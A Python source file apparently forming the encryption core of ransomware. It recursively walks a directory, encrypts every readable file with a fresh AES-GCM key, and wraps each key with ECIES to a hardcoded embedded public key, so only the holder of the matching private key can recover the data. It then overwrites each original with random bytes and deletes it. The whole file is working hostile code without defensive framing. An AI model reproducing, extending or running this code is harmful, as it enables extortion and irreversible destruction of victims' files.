import os
import struct
import tempfile
import secrets
import base64

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.ec import SECP256R1

IV_LEN = 12
TAG_LEN = 16
CHUNK = 64 * 1024
SALT_LEN = 16
HKDF_LEN = 32
VER = 1

PUB_KEY = b"""-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEvv915Q1SWQ+K5D5+Eq69r75iyoH6
52e1sNf8DOl0PX36ZYnlDnZ14ljSLoI3C26wO/qHzQELJhUvHsSnQhjgqQ==
-----END PUBLIC KEY-----"""

def gen_key():
    return bytearray(secrets.token_bytes(32))

def del_key(k):
    for i in range(len(k)):
        k[i] = secrets.randbits(8)
    for i in range(len(k)):
        k[i] = 0

def del_file(path: str):
    if not os.path.isfile(path):
        return False

    size = os.path.getsize(path)

    try:
        with open(path, "r+b") as f:
            rem = size
            while rem > 0:
                n = min(CHUNK, rem)
                f.write(secrets.token_bytes(n))
                rem -= n
            f.flush()
            try:
                os.fsync(f.fileno())
            except OSError:
                pass

        os.remove(path)
        return True
    except PermissionError:
        try:
            os.remove(path)
        except Exception:
            pass
        return False
    except OSError:
        try:
            os.remove(path)
        except Exception:
            pass
        return False

def wrap(key, pub_pem):
    
    pub = serialization.load_pem_public_key(pub_pem)

    priv = ec.generate_private_key(SECP256R1())
    eph = priv.public_key()
    eph_der = eph.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    shared = priv.exchange(ec.ECDH(), pub)

    salt = secrets.token_bytes(SALT_LEN)
    hkdf = HKDF(
        algorithm=hashes.SHA256(),
        length=HKDF_LEN,
        salt=salt,
        info=b"ecies-aes-gcm",
    )
    wkey = hkdf.derive(shared)

    iv = secrets.token_bytes(IV_LEN)
    gcm = AESGCM(wkey)
    aad = struct.pack("B", VER) + eph_der + salt
    ct_tag = gcm.encrypt(iv, bytes(key), aad)
    ct = ct_tag[:-TAG_LEN]
    tag = ct_tag[-TAG_LEN:]

    blob = bytearray()
    blob.append(VER)
    blob.append(len(salt))
    blob += salt
    blob += struct.pack(">H", len(eph_der))
    blob += eph_der
    blob += iv
    blob += struct.pack(">I", len(ct))
    blob += ct
    blob += tag

    try:
        del_key(bytearray(wkey))
        del wkey, shared, priv
    except Exception:
        pass

    return bytes(blob)

def enc_file(path, del_orig=True):
    if not os.path.isfile(path):
        return False, None, None

    key = gen_key()
    tmp = None

    out = os.path.join(
        os.path.dirname(path) or ".",
        os.path.basename(path) + ".enc"
    )

    try:
        iv = secrets.token_bytes(IV_LEN)

        cipher = Cipher(
            algorithms.AES(bytes(key)),
            modes.GCM(iv),
        )
        enc = cipher.encryptor()

        fd, tmp = tempfile.mkstemp(
            prefix=".tmp_enc_",
            dir=os.path.dirname(path) or "."
        )
        os.close(fd)

        with open(path, "rb") as fin, open(tmp, "wb") as fout:
            fout.write(iv)

            while True:
                chunk = fin.read(CHUNK)
                if not chunk:
                    break
                fout.write(enc.update(chunk))

            fout.write(enc.finalize())
            fout.write(enc.tag)

            fout.flush()
            os.fsync(fout.fileno())

        blob = wrap(key, PUB_KEY)

        os.replace(tmp, out)
        tmp = None

        if del_orig:
            del_file(path)

        return True, blob, out

    except (PermissionError, OSError, ValueError):
        if tmp and os.path.exists(tmp):
            try:
                os.remove(tmp)
            except Exception:
                pass
        if os.path.exists(out):
            try:
                os.remove(out)
            except Exception:
                pass
        return False, None, None

    finally:
        del_key(key)

def encryption(dir_path):
    files = []
    count = 0

    for root, _, names in os.walk(dir_path):
        for name in names:
            if name.endswith(".enc") or name.startswith(".tmp_enc_"):
                continue

            path = os.path.join(root, name)

            if not os.path.isfile(path) or not os.access(path, os.R_OK):
                continue

            try:
                ok, blob, enc_path = enc_file(path)
                if not ok:
                    continue

                info = {
                    "original_path": path,
                    "encrypted_path": enc_path,
                    "key_blob": base64.b64encode(blob).decode()
                }
                
                files.append(info)
                count += 1

            except Exception:
                continue


    return files
